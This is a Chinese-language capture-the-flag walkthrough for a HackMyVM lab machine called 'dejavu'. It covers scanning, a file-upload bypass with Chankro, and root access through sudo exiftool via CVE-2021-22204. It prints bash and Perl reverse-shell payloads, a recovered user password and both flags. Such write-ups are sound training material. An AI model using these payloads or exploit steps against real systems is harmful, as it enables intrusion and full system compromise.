# 信息搜集

主机发现

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:39:60:4c, IPv4: 192.168.43.126
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.43.1    c6:45:66:05:91:88       (Unknown: locally administered)
192.168.43.197  04:6c:59:bd:33:50       Intel Corporate
192.168.43.209  08:00:27:32:ef:93       PCS Systemtechnik GmbH
192.168.43.156  b2:a8:93:0d:fb:bd       (Unknown: locally administered)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.009 seconds (127.43 hosts/sec). 4 responded
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.43.209
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 23:40 EDT
Nmap scan report for dejavu (192.168.43.209)
Host is up (0.000084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:32:EF:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.92 seconds
                                                                     
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.43.209
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 23:41 EDT
Nmap scan report for dejavu (192.168.43.209)
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:32:EF:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.43.209 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,git,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.209
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,git,zip,html,txt,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10918]
/.html                (Status: 403) [Size: 279]
/info.php             (Status: 200) [Size: 69969]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 279]
Progress: 8982631 / 9482040 (94.73%)[ERROR] Get "http://192.168.43.209/comment-script": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/info.php找到了一段注释

![image](https://github.com/user-attachments/assets/d7bda8ea-9132-4b03-9004-7418a741c117)

/S3cR3t

![image](https://github.com/user-attachments/assets/30d2afda-2d50-4266-9252-14bb0bfc7b60)

查看一下upload.php

![image](https://github.com/user-attachments/assets/82f983aa-8531-4813-a303-388a75e0a795)

有防护，使用Chankro，上传一个反弹shell

![image](https://github.com/user-attachments/assets/7232df1c-905c-4c2c-8a81-1c6fa335fb81)

```
┌──(kali㉿kali)-[~]
└─$ cat 1.sh 
bash -c 'bash -i >& /dev/tcp/192.168.43.126/4444 0>&1'
┌──(kali㉿kali)-[~]
└─$ python2 Chankro/chankro.py --arch 64 --input 1.sh --output 4444.phtml --path /var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats 


     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: 1.sh
[+] Architecture: x64
[+] Final PHP: 4444.phtml


[+] File created!
```

获取到了shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.43.126] from (UNKNOWN) [192.168.43.209] 53064
bash: cannot set terminal process group (771): Inappropriate ioctl for device
bash: no job control in this shell
<nMostCriticalInternetSecurityThreats/S3cR3t/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<nMostCriticalInternetSecurityThreats/S3cR3t/files$
```

# 权限提升

上传一下脚本，看一看有没有可以利用的

![image](https://github.com/user-attachments/assets/8f9cca41-0afd-464f-b2dc-0ba52a3adf75)

尝试抓一下包，发现了密码：9737bo0hFx4

![image](https://github.com/user-attachments/assets/91eb58b6-dcad-4e29-a0cc-3e98ff773e87)

切换到robert用户

```
<nMostCriticalInternetSecurityThreats/S3cR3t/files$ su robert
su robert
Password: 9737bo0hFx4
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(pcap)
```

user.txt

```
robert@dejavu:~$ cat user.txt
cat user.txt
HMV{c8b75037150fbdc49f6c941b72db0d7c}
```

发现可利用的地方

```
robert@dejavu:~$ sudo -l
sudo -l
Matching Defaults entries for robert on dejavu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on dejavu:
    (root) NOPASSWD: /usr/local/bin/exiftool
robert@dejavu:~$ head -15 /usr/local/bin/exiftool
head -15 /usr/local/bin/exiftool
#!/usr/bin/perl -w
#------------------------------------------------------------------------------
# File:         exiftool
#
# Description:  Read/write meta information
#
# Revisions:    Nov. 12/03 - P. Harvey Created
#               (See html/history.html for revision history)
#------------------------------------------------------------------------------
use strict;
require 5.004;

my $version = '12.23';

# add our 'lib' directory to the include list BEFORE 'use Image::ExifTool'
```

![image](https://github.com/user-attachments/assets/3abc747a-1206-45d4-8965-4ec46fecc99e)

提权

```
robert@dejavu:~$ python3 50911.py -s 192.168.43.126 1234
python3 50911.py -s 192.168.43.126 1234

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(1234,inet_aton('192.168.43.126')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")        
RUNTIME: DONE - Exploit image written to 'image.jpg'

robert@dejavu:~$ sudo /usr/local/bin/exiftool image.jpg
sudo /usr/local/bin/exiftool image.jpg

┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 1234          
listening on [any] 1234 ...
connect to [192.168.43.126] from (UNKNOWN) [192.168.43.209] 33370
# id
uid=0(root) gid=0(root) groups=0(root)
```

root.txt

```
# cat r0ot.tXt
HMV{c62d75d636f66450980dca2c4a3457d8}
```
